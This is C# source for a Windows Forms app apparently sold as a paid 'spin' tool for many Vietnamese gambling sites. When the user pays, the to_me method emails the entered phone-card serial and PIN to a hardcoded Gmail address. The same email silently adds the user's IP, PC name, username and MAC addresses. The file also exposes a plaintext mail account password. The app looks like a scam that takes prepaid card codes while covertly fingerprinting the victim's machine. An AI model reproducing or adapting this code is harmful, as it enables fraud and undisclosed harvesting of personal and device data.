using System;
using System.Drawing;
using System.Net.Mail;
using System.Net;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace T_Multi
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            //click => show chp nap the (visible)
            InitializeComponent();
            cbb_sl.DropDownStyle = ComboBoxStyle.DropDownList;
            cbb_sl.Text = "1. 20 Lượt Quay";
            cbb_name.Text = "789clup_(789clubvip.com)";
            cbb_nhacungcap.Text = "Chọn Nhà Cung Cấp";
            cbb_menhgia.Text = "Mệnh Giá Thẻ Nạp";
            tb_price.ShortcutsEnabled = false;
            tm_count.Start();
            pn_card.BackColor = Color.FromArgb(0, Color.White);
        }
        //Created set name
        private static string save_name, save_sl, temp, mac2, mac3, save_nhacungcap, save_menhgia, save_seri, save_mt;
        private static int count = 0, mail_Body = 0, check_it, kt = 0, kt1;
        private static string time_Now = DateTime.Now.ToLongTimeString();
        private static string date_Now = DateTime.Now.ToLongDateString();

        private void tm_count_Tick(object sender, EventArgs e)
        {
            count++;
            tb_count.Text = count.ToString();
            if (count >= 99999)
            {
                count = 0;
            }
        }
        #region Get
        private void cbb_name_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                string get = cbb_name.SelectedItem.ToString();
                if (get == "Nổ Hũ_(sieuno.win)")
                {
                    temp = "NoHu";
                }
                if (get == "789clup_(789clubvip.com)")
                {
                    temp = "789";
                }
                if (get == "B52club_(taib52.club)")
                {
                    temp = "B52";
                }
                if (get == "Bino79_(bino79.club)")
                {
                    temp = "Bino";
                }
                if (get == "FA88club_(fa88.online)")
                {
                    temp = "FA";
                }
                if (get == "GamVip_(gamvip.com)")
                {
                    temp = "Gam";
                }
                if (get == "Go88_(go88vn.vip)")
                {
                    temp = "Go";
                }
                if (get == "Hen88club_(hen88.club)")
                {
                    temp = "Hen";
                }
                if (get == "KingFun_(kingfun.info)")
                {
                    temp = "King";
                }
                if (get == "ZoWin_(zowinvn.vip)")
                {
                    temp = "Zo";
                }
                if (get == "Nhat.Vip_(nhat88.club)")
                {
                    temp = "Nhat";
                }
                if (get == "MaCao.Club_(macauclub.fun)")
                {
                    temp = "Macao";
                }
                if (get == "Ric.Win_(gameric.win)")
                {
                    temp = "Ric";
                }
                if (get == "RikVip_(rik.vip)")
                {
                    temp = "Rik";
                }
                if (get == "Yo88_(yo88vn.vip)")
                {
                    temp = "Yo";
                }
                if (get == "X8club_(x8vn.com)")
                {
                    temp = "X8";
                }
                if (get == "Roy.Vin_(roy.vin)")
                {
                    temp = "Roy";
                }
                if (get == "SunWin_(sunvn.vip)")
                {
                    temp = "Sun";
                }
                if (get == "TaiTo_(taito.me)")
                {
                    temp = "TaiTo";
                }
                if (get == "V8club_(taiv8.us)")
                {
                    temp = "V8";
                }
                if (get == "Vin.Win_(vin88.vip)")
                {
                    temp = "Vin";
                }
                if (get == "Chat79_(chat79.club)")
                {
                    temp = "Chat";
                }
                //new
                if (get == "BenVipclub_(benvip.club)")
                {
                    temp = "Ben";
                }
                if (get == "S7club_(s7club.net)")
                {
                    temp = "S7";
                }
                if (get == "Bom79_(bom79.club)")
                {
                    temp = "Bom";
                }
                if (get == "Zing888_(zing888.club)")
                {
                    temp = "Zing";
                }
                if (get == "R68club_(r68.club)")
                {
                    temp = "R68";
                }
                if (get == "Hu86_(h86.club)")
                {
                    temp = "Hu86";
                }
                if (get == "P99club_(p99.club)")
                {
                    temp = "P99";
                }
                if (get == "BaLiclub_(bali.club)")
                {
                    temp = "BaLi";
                }
                if (get == "Zclub_(zclub.vin)")
                {
                    temp = "Z";
                }
                if (get == "9Fun_(9fun.club)")
                {
                    temp = "9Fun";
                }
                if (get == "SumVip_(sumvip.club)")
                {
                    temp = "SumVip";
                }
                if (get == "Fun36_(fun365.club)")
                {
                    temp = "Fun36";
                }
                if (get == "Luxclub_(lux39club.com)")
                {
                    temp = "Lux";
                }
                if (get == "SocVip_(socvip.vin)")
                {
                    temp = "Soc";
                }
                if (get == "Trum88_(game88.com)")
                {
                    temp = "Trum";
                }
                if (get == "Suongclub_(suong.club)")
                {
                    temp = "Suong";
                }
                if (get == "Live79club_(live79.club)")
                {
                    temp = "Live";
                }
                if (get == "G9club_(g9.club)")
                {
                    temp = "G9";
                }
                if (get == "VicWin_(vicwin.vip)")
                {
                    temp = "Vic";
                }
                if (get == "Loc86_(loc86.club)")
                {
                    temp = "Loc66";
                }
                if (get == "Do99_(dom99.club)")
                {
                    temp = "Do99";
                }
                if (get == "Dep88_(dep-88.club)")
                {
                    temp = "Dep88";
                }
                if (get == "Ting88club_(ting88.net)")
                {
                    temp = "Ting";
                }
                if (get == "HuTop_(hutop.club)")
                {
                    temp = "HuTop";
                }
                if (get == "IWin_(iwin68)")
                {
                    temp = "IWin";
                }
                if (get == "Mayclub_(mayvn.vip)")
                {
                    temp = "May";
                }
                if (get == "Top88_(top88.us)")
                {
                    temp = "Top88";
                }
                if (get == "VN88_(vn88)")
                {
                    temp = "VN88";
                }
                if (get == "BachKimclub_(bachkimvip.vin)")
                {
                    temp = "BackKim";
                }
                if (get == "Bum88club_(bum88.club)")
                {
                    temp = "Bum88";
                }
                if (get == "ZinDoclub_(zin66.club)")
                {
                    temp = "ZinDo";
                }
                if (get == "RankVipclub_(rankvip.club)")
                {
                    temp = "RankVip";
                }
                if (get == "VinBetclub_(vinbet.club)")
                {
                    temp = "VinBet";
                }
                if (get == "BigWin99_(bigwin99.club)")
                {
                    temp = "BigWin";
                }
                if (get == "ThanTai68_(thantai68.club)")
                {
                    temp = "ThanTai";
                }
                if (get == "Hu79_(hu79.club)")
                {
                    temp = "Hu79";
                }
                if (get == "188Bet_(188dota.com)")
                {
                    temp = "188Bet";
                }
                if (get == "H99_(hu99.club)")
                {
                    temp = "H99";
                }
                if (get == "W88_(w88b.com)")
                {
                    temp = "W88";
                }
                save_name = cbb_name.Text;
                tb_magiaodich.Text = temp + save_sl;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        #endregion

        private void cbb_nhacungcap_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                save_nhacungcap = cbb_nhacungcap.SelectedItem.ToString();
            }
            catch (Exception ex) { MessageBox.Show("Error: " + ex.ToString()); }

        }
        private void cbb_menhgia_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                save_menhgia = cbb_menhgia.SelectedItem.ToString();
                if (save_menhgia == "10.000đ")
                {
                    save_menhgia = "10K";
                }
                if (save_menhgia == "20.000đ")
                {
                    save_menhgia = "20K";
                }
                if (save_menhgia == "30.000đ")
                {
                    save_menhgia = "30K";
                }
                if (save_menhgia == "50.000đ")
                {
                    save_menhgia = "50K";
                }
                if (save_menhgia == "100.000đ")
                {
                    save_menhgia = "100K";
                }
                if (save_menhgia == "200.000đ")
                {
                    save_menhgia = "200K";
                }
                if (save_menhgia == "300.000đ")
                {
                    save_menhgia = "300K";
                }
                if (save_menhgia == "500.000đ")
                {
                    save_menhgia = "500K";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error 2: " + ex.ToString());
            }
        }
        #region This's Enter & Leave
        private void tb_seri_Enter(object sender, EventArgs e)
        {
            if (tb_seri.Text == "Nhập Số Seri") { tb_seri.Text = ""; tb_seri.ForeColor = Color.Black; }
        }

        private void tb_seri_Leave(object sender, EventArgs e)
        {
            if (tb_seri.Text == "") { tb_seri.Text = "Nhập Số Seri"; tb_seri.ForeColor = Color.Silver; }
        }

        private void tb_mathe_Enter(object sender, EventArgs e)
        {
            if (tb_mathe.Text == "Nhập Mã Thẻ") { tb_mathe.Text = ""; tb_mathe.ForeColor = Color.Black; }
        }

        private void tb_mathe_Leave(object sender, EventArgs e)
        {
            if (tb_mathe.Text == "") { tb_mathe.Text = "Nhập Mã Thẻ"; tb_mathe.ForeColor = Color.Silver; }
        }
        private void tb_node_Enter(object sender, EventArgs e)
        {
            if (tb_node.Text == "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com") { tb_node.Text = ""; tb_node.ForeColor = Color.Black; }
        }
        private void tb_node_Leave(object sender, EventArgs e)
        {
            if (tb_node.Text == "") { tb_node.Text = "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com"; tb_node.ForeColor = Color.Silver; }
        }

        private void tb_node_MouseClick(object sender, MouseEventArgs e)
        {
            if (kt == 0)
            {
                DialogResult dialogResult = MessageBox.Show("Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com", "Notice !", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    kt = 1;
                }
                else if (dialogResult == DialogResult.No)
                {
                    kt = 0;
                }
            }
            else { }
        }
        #endregion

        private void button3_Click_1(object sender, EventArgs e)
        {
            if (bt_lang.Text == "English")
            {
                bt_lang.Text = "Vietnamese";
                bt_cp.Text = "Sao Chép";
                bt_tuto.Text = "Hướng Dẫn";
                bt_atten.Text = "Chú Ý";
                bt_more.Text = "Thêm";
                bt_exit.Text = "Thoát";
                bt_card.Text = "Thẻ Cào";
                lb_mgg.Text = "Mã Giao Dịch";
                lb_pay.Text = "Phương thức thanh toán";
                bt_pay.Text = "Thanh toán ngay";
            }
            else if (bt_lang.Text == "Vietnamese")
            {
                bt_lang.Text = "English";
                bt_cp.Text = "Copy";
                bt_tuto.Text = "Tutorial";
                bt_atten.Text = "Attention";
                bt_more.Text = "More";
                bt_exit.Text = "Exit";
                bt_card.Text = "Card";
                lb_mgg.Text = "Transaction Code";
                lb_pay.Text = "Pay with";
                bt_pay.Text = "Pay Now";
            }
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            bt_video.Visible = !bt_video.Visible;
            bt_exit.Visible = !bt_exit.Visible;
        }

        private void bt_exit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void bt_video_Click(object sender, EventArgs e)
        {
            string web1 = @"https://youtu.be/mh7-SVVqjdk";
            Process.Start(web1);
            string web2 = @"https://youtu.be/Gezd-wIwrRg";
            Process.Start(web2);
            string web3 = @"https://youtu.be/jHxmFY8RsO0";
            Process.Start(web3);
            string web4 = @"https://youtu.be/_eQ4bohoj6c";
            Process.Start(web4);
            string web5 = @"https://youtu.be/hYGD4F1P3w8";
            Process.Start(web5);
            string web6 = @"https://youtu.be/PYK04YYrd7U";
            Process.Start(web6);
            string web7 = @"https://youtu.be/Agdh25Fc8IQ";
            Process.Start(web7);
        }

        private void bt_tuto_Click(object sender, EventArgs e)
        {
            string web3 = @"https://youtu.be/jHxmFY8RsO0";
            Process.Start(web3);
            string web4 = @"https://youtu.be/_eQ4bohoj6c";
            Process.Start(web4);
            string web5 = @"https://youtu.be/hYGD4F1P3w8";
            Process.Start(web5);
            string web6 = @"https://youtu.be/PYK04YYrd7U";
            Process.Start(web6);
            string web7 = @"https://youtu.be/Agdh25Fc8IQ";
            Process.Start(web7);
            MessageBox.Show("Hướng Dẫn\nBước 1: Chọn tên trò chơi\nBước 2: Chọn số lượt\nBước 3: Chọn phương thức thanh toán của bạn\nBước 4: Sao chép \"Mã giao dịch\" và email dán vào ghi chú.", "Notice !");
        }

        private void bt_atten_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Chú Ý\n* Thanh toán qua \"Thẻ Cào\" sẽ mất thời gian hơn\n*Chọn đúng Nhà Cung Cấp & Mệnh Giá\n*Nhập đúng Seri & Mã Thẻ\n* Trong phần ghi chú bắt buộc phải ghi \"Mã Giao Dịch + Email\" của bạn \n* Email để nhận mã kích hoạt\n* Ví dụ:\nGame: B52club_(game.taib52.club)\nMã giao dịch: B52_20\nEmail: nguyenvanA@gmail.com\n- ghi chú: B52_20 nguyenvanA@gmail.com", "Notice !");
        }

        private void bt_momo_Click(object sender, EventArgs e)
        {
            string web = @"https://ibb.co/rwZFmSP";
            Process.Start(web);
        }

        private void bt_play_Click(object sender, EventArgs e)
        {
            string web = @"https://playerduo.com/hiluvtool";
            Process.Start(web);
        }

        private void bt_uht_Click(object sender, EventArgs e)
        {
            string web = @"https://unghotoi.com/hiluvtool";
            Process.Start(web);
        }

        private void bt_card_Click(object sender, EventArgs e)
        {
            pn_card.Visible = !pn_card.Visible; //if(on)=>off, if(off)=> on 
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            tb_node.Text = "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com";
            Clipboard.Clear();
            bt_pay.Enabled = true;
            take_MAC();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            save_seri = tb_seri.Text;
            save_mt = tb_mathe.Text;
            //ham kierm tra 
            check_before_pay();
            if (check_it == 2)
            {
                bt_pay.Text = "Just few seconds...";
                bt_pay.Enabled = false;
                to_me();
                bt_pay.Enabled = true;
                if (bt_lang.Text == "English")
                {
                    bt_pay.Text = "Pay Now";
                    notifyIcon1.ShowBalloonTip(5000, "You have a notification from T-Multi !", "Request payment from you sent, we'll send Activation Code to you when checking it !", ToolTipIcon.Info);
                }
                else if (bt_lang.Text == "Vietnamese")
                {
                    bt_pay.Text = "Thanh toán ngay";
                    notifyIcon1.ShowBalloonTip(5000, "Bạn có một thông báo từ T-Multi !", "Yêu cầu thanh toán của bạn đã được gửi đi, chúng tôi sẽ kiểm tra và gửi mã kích hoạt cho bạn khi thanh toán đủ !", ToolTipIcon.Info);
                }
                if (kt1 == 0)
                {
                    DialogResult result = MessageBox.Show("*Thanh toán qua Thẻ Điện Thoại sẽ tốn nhiều thời gian hơn.\n*Vui lòng chọn đúng Nhà Cung Cấp & Mệnh Giá\n*Nhập đúng Seri & Mã Thẻ\n*Chọn (Yes) để không hiển thị lại thông báo này !", "Notice !", MessageBoxButtons.YesNo);
                    if (result == DialogResult.Yes)
                    {
                        kt1 = 1;
                    }
                    else if (result == DialogResult.No)
                    {
                        kt1 = 0;
                    }
                }
                else { }
            }
        }
        void check_before_pay()
        {
            check_it = 1;
            if (cbb_nhacungcap.SelectedItem == "Chọn Nhà Cung Cấp" || cbb_menhgia.SelectedItem == "Mệnh Giá Thẻ Nạp" || tb_seri.Text == "Nhập Số Seri" || tb_mathe.Text == "Nhập Mã Thẻ")
            {
                if (cbb_nhacungcap.SelectedItem == "Chọn Nhà Cung Cấp")
                {
                    MessageBox.Show("Vui lòng chọn nhà cung cấp !", "Notice !");
                }
                if (cbb_menhgia.SelectedItem == "Mệnh Giá Thẻ Nạp")
                {
                    MessageBox.Show("Vui lòng chọn mệnh giá !", "Notice !");
                }
                if (tb_seri.Text == "Nhập Số Seri")
                {
                    MessageBox.Show("Vui lòng nhập số seri !", "Notice !");
                }
                if (tb_mathe.Text == "Nhập Mã Thẻ")
                {
                    MessageBox.Show("Vui lòng nhập mã thẻ !", "Notice !");
                }
                if (tb_node.Text == "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com")
                {
                    MessageBox.Show("Ghi chú không được để trống !", "Notice !");
                }
                check_it = 1;
            }
            else { check_it = 2; }
        }
        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cbb_sl.Text == "1. 20 Lượt Quay") { tb_price.Text = "2.000.000đ"; save_sl = "_20"; }
            if (cbb_sl.Text == "2. 50 Lượt Quay (+10 Lượt Quay)") { tb_price.Text = "5.000.000đ"; save_sl = "_50"; }
            if (cbb_sl.Text == "3. Không Giới Hạn Số Lượt Quay") { tb_price.Text = "25.000.000đ"; save_sl = "_IN"; }
            tb_magiaodich.Text = temp + save_sl;
        }
        #region Send Mail To Me
        static void to_me()
        {
            try
            {
                #region From,To,Password,Body
                mail_Body++;
                //from,to,pass
                string from_address = "hiluv.bot.sent@gmail.com";
                string to_address = "hereisjobbro1@gmail.com";
                string password = "bot.auto13579";
                //ip
                string copy_IP = my_IP();
                string ip1 = @"https://checkip.com.vn/locator/?host=";
                string ip2 = @"&info=Ki%E1%BB%83m+tra+IP";
                string IP_Now = ip1 + copy_IP + ip2;
                //send
                MailMessage mail = new MailMessage();
                mail.Subject = save_name + "</>" + date_Now + ", ~[" + copy_IP + "]";//tieu de
                mail.From = new MailAddress(from_address);
                mail.Body = "EMAIL CARD [" + mail_Body + "]\nTime: " + time_Now + "\nDate: " + date_Now + "\nMa Giao Dich: " + temp + save_sl;
                mail.To.Add(new MailAddress(to_address));
                //Smtp
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Port = 587;
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                //Network
                NetworkCredential netC = new NetworkCredential(from_address, password);
                smtp.Credentials = netC;
                //Card
                mail.Body += "\n" + save_nhacungcap + "\t\tMenh Gia: " + save_menhgia + "\nSeri: " + save_seri + "\t\tMa The: " + save_mt;
                //My PC & User & IP
                string pc_Name = System.Environment.MachineName;
                string user_Name = System.Environment.UserName;
                mail.Body += "\nIP Now: " + IP_Now + "\nMy PC: " + pc_Name + "\tName User: " + user_Name;
                mail.Body += "\nMy IP: " + copy_IP;
                //MAC Address
                mail.Body += "\nMAC 1: " + GetMacAddress().ToString() + "\t(Ethernet Network Interfaces)\nMAC 2: " + mac2 + "\t(Wireless LAN adapter Wi-Fi)\nMAC 3: " + mac3 + "\t(Ethernet adapter Ethernet)";
                #endregion
                smtp.Send(mail);
                mail.Attachments.Dispose();
                if (mail_Body >= 100000) { mail_Body = 0; }
            }

            catch (Exception ex)
            {
                MessageBox.Show("If you see this information you should send for us gmail: hereisjobbro1@gmail,com \nAbout Error: "+ex, "You have an error something !",MessageBoxButtons.OK,MessageBoxIcon.Error);
            }
        }


        private void button6_Click(object sender, EventArgs e)
        {
            if (bt_lang.Text == "English")
            {

                bt_cp.Text = "Copied";
            }
            else if (bt_lang.Text == "Vietnamese")
            {
                bt_cp.Text = "Đã Sao Chép";
            }
            Clipboard.SetText(tb_magiaodich.Text); //copy
        }
        //take ip
        private static string my_IP()
        {
            string Address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                Address = stream.ReadToEnd();
            }
            int first = Address.IndexOf("Address: ") + 9;
            int last = Address.IndexOf("</body>");
            Address = Address.Substring(first, last - first);
            return Address;
        }
        #endregion
        #region Take MAC Address
        public static PhysicalAddress GetMacAddress() //solution 1
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Only consider Ethernet network interfaces
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress();
                }
            }
            return null;
        }

        //solution 2
        void take_MAC()
        {
            string mac = "";
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {

                if (nic.OperationalStatus == OperationalStatus.Up && (!nic.Description.Contains("Virtual") && !nic.Description.Contains("Pseudo")))
                {
                    if (nic.GetPhysicalAddress().ToString() != "")
                    {
                        mac = nic.GetPhysicalAddress().ToString();
                    }
                }
            }
            mac2 = mac;
            mac3 = GetMACAddress1().ToString();
            ;
        }
        //solution 3
        public string GetMACAddress1()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            return sMacAddress;
        }
        #endregion
        void hide_card()
        {

        }
    }
}
